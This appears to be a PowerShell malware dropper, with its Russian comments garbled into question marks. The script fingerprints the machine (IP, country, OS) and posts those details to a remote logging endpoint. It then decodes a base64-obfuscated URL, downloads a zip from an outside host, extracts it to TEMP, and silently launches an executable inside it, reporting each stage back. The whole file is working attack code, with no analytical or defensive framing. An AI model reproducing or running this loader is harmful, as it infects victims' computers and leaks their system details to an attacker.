[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host "?????? ???????"

try {
    # ???? ?????????? ? ???????
    $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json"
    Write-Host "IP-?????? ????????: $ipInfo"
    $ip = $ipInfo.ip
    $country = $ipInfo.country
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    Write-Host "??: $os, ??????: $country"

    # ???????????? ?????? ??? ?????????? ?????????
    $info = @{
        ip = $ip
        country = $country
        flag = "??"
        os = $os
        message = ":rocket: Script execution started successfully.`nEarth IP: $ip`nLocation Country: $country`nSystem Operating system: $os`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    }

    # ??????????? ? JSON ? ???????? ?????????? ?????????
    $infoJson = $info | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri "https://alphabit.vc/js/log.php" -Method POST -Body $infoJson -ContentType "application/json"
    Write-Host "????????? ????????? ??????????."
} catch {
    Write-Host "?????? ??? ????? ?????????? ? ???????: $_"
}

# ?????? ????????
$e = @(
    @{u="aHR0cHM6Ly9pbmZlcm5vZW5qb3llci5jZmQvMS56aXA=";z="ZG93bmxvYWQuemlw";x="ZXh0cmFjdA==";e="dmVyaWZ5LmV4ZQ=="}
)

function d([string]$s) {
    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))
}

foreach ($r in $e) {
    try {
        $u = d $r.u
        $z = Join-Path $env:TEMP (d $r.z)
        $x = Join-Path $env:TEMP (d $r.x)
        $n = d $r.e

        # ?????????? ZIP-?????
        Write-Host "?????????? ZIP ? $u"
        Invoke-WebRequest -Uri $u -OutFile $z

        if (Test-Path $z) {
            Write-Host "ZIP-???? ??????: $z"
            $statusMessage = ":package: ZIP file downloaded successfully: $z"
        } else {
            Write-Host "??????: ZIP-???? ?? ??????."
            $statusMessage = ":x: ZIP file not downloaded: $u"
            continue
        }

        # ???????? ??????? ??????????
        $info.message = $statusMessage
        $infoJson = $info | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri "" -Method POST -Body $infoJson -ContentType "application/json"

        # ?????????? ZIP-?????
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($z, $x)
        Write-Host "ZIP-???? ?????????? ? $x"
        $statusMessage = ":open_file_folder: ZIP file extracted to: $x"

        # ???????? ??????? ??????????
        $info.message = $statusMessage
        $infoJson = $info | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri "log.php" -Method POST -Body $infoJson -ContentType "application/json"

        # ?????? EXE-?????
        $p = Join-Path $x $n
        if (Test-Path $p) {
            Write-Host "?????? ?????: $p"
            Start-Sleep -Seconds 5
            Start-Process -FilePath $p -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass"
            $statusMessage = ":white_check_mark: Executable file launched successfully: $p"
        } else {
            Write-Host "??????: ???? $p ?? ??????."
            $statusMessage = ":x: Executable file not found: $p"
        }

        # ???????? ??????? ???????
        $info.message = $statusMessage
        $infoJson = $info | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri "https://alphabit.vc/js/log.php" -Method POST -Body $infoJson -ContentType "application/json"
    } catch {
        $statusMessage = ":x: An error occurred during execution: $_"
        Write-Host "?????? ??????????: $_"
        $info.message = $statusMessage
        $infoJson = $info | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri "https://alphabit.vc/js/log.php" -Method POST -Body $infoJson -ContentType "application/json"
    }
}
